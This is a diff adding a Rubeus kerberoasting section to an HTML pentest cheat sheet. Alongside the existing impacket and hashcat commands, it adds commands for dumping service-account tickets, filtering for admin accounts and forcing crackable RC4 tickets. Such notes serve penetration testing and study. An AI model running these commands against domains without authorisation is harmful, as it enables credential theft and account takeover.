@@ -260,7 +260,23 @@ impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user 
                         <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                         <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                         <p>Show the hash</p>
-                        <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
+                        <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>
+                        
+                        <h4>Rubeus.exe</h4>
+                        <ul>
+                            <p>We can perform the same thing from inside using rubeus.exe There are some useful commands which should be noted</p>
+                            <p>Showing stats about the kerberoastable users and the date of last password change</p>
+                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /stats</code></pre>
+                            <p>List all tickets from kerberoastable users</p>
+                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /nowrap</code></pre>
+                            <p>Filtering for accounts with admincount=1</p>
+                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></pre>
+                            <p>Filtering for a single user</p>
+                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap</code></pre>
+                            <p>Showing only RC4 tickets. Which are the easier ones to crack</p>
+                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /tgtdeleg /nowrap</code></pre>
+                            <p><b>Important note: You should "always" go for tickets which are in RC4 (type 23) encryption mode since it's quickly to crack them. In case you found AES 128/256 (type 24 and 18) have in mind that this ones are harder to crack and hashcat will take it's time. In order to check which type you are facing you could lok at the property supported Etypes or look at the ticket $krb5tgs$18$ ($krb5tgs$TYPE$)</b></p>
+                        </ul>
                     </ul>
 
                     <h3>Ticket attacks</h3>
